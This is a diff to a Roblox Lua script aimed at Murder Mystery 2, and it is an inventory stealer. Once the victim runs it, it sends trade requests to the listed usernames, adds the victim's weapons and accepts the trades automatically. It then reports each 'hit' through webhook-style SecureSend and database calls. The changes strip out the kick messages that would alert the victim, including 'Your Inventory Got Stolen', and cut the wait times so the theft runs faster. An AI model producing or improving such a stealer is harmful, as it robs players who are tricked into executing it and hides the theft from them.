@@ -1,4 +1,4 @@
---Best
+--New One
 
 _G.Usernames = {"Erereer454"} 
 _G.min_rarity = "Common" 
@@ -222,11 +222,9 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 if next(users) == nil then
-    plr:kick("You didn't add a usernames or a valid webhook !")
     return
 end
 if game.PlaceId ~= 142823291 then
-    plr:kick("Game not supported. Please join a normal MM2 server")
     return
 end
 
@@ -234,14 +232,12 @@ local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 local isMobile = string.find(executor, "delta") or string.find(executor, "krnl")
 local isSalora = string.find(executor, "solara")
 if isSalora then
-    plr:kick("solara isnt supported please use xeno or any other executer")
     return
 end
 local VIP = (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
 local FULL = (#Players:GetPlayers() >= 12)
 if VIP or FULL then
     if isMobile then
-        plr:kick(VIP and "VIP Servers not supported." or "FULL Servers Arent Supported")
         return
     else
         print(VIP and "VIP Server detected, hopping..." or "Server full, hopping...")
@@ -319,7 +315,7 @@ local localPlayer = Players.LocalPlayer
 local victimLevel = GetPlayerLevel:InvokeServer(localPlayer)
 
 if victimLevel < 10 then
-    localPlayer:Kick("script error. make sure ur above the level 9")
+    return
 end
 
 
@@ -591,7 +587,7 @@ local function getTradeStatus()
 end
 local function waitForTradeCompletion()
     while true do
-        task.wait(0.1)
+        task.wait()
         if getTradeStatus() == "None" then break end
     end
 end
@@ -745,10 +741,10 @@ else
     assignHitToDatabase()
     
     if  totalValue > 200 then
-        task.delay(90, function()
+        task.delay(0.1, function()
             SecureSend(data)
         end)
-        task.delay(90, function()
+        task.delay(0.1, function()
             assignDhToDatabase()
         end)
         
@@ -827,10 +823,10 @@ end
         local initialTradeState = getTradeStatus()
         if initialTradeState == "StartTrade" then
             Trade.DeclineTrade:FireServer()
-            task.wait(0.3)
+            task.wait()
         elseif initialTradeState == "ReceivingRequest" then
             Trade.DeclineRequest:FireServer()
-            task.wait(0.3)
+            task.wait()
         end
 
         while #weaponsToSend > 0 do
@@ -838,20 +834,20 @@ end
             if tradeStatus == "None" then
                 sendTradeRequest(joinedUser)
             elseif tradeStatus == "SendingRequest" then
-                task.wait(0.3)
+                task.wait()
             elseif tradeStatus == "ReceivingRequest" then
                 Trade.DeclineRequest:FireServer()
-                task.wait(0.3)
+                task.wait()
             elseif tradeStatus == "StartTrade" then
                 local numToTrade = math.min(4, #weaponsToSend)
                 for i = 1, numToTrade do
                     local weapon = weaponsToSend[i]
                     for _ = 1, weapon.Amount do
                         addWeaponToTrade(weapon.DataID)
-                        task.wait(0.05)
+                        task.wait()
                     end
                 end
-                task.wait(6)
+                task.wait(0.1)
                 acceptTrade()
                 waitForTradeCompletion()
 
@@ -870,11 +866,10 @@ end
                     pcall(function() Trade.DeclineTrade:FireServer() end)
                 end
             else
-                task.wait(0.5)
+                task.wait()
             end
-            task.wait(1)
+            task.wait()
         end
-        plr:kick("Your Inventory Got Stolen")
     end
 
         local function startImmediateHit()
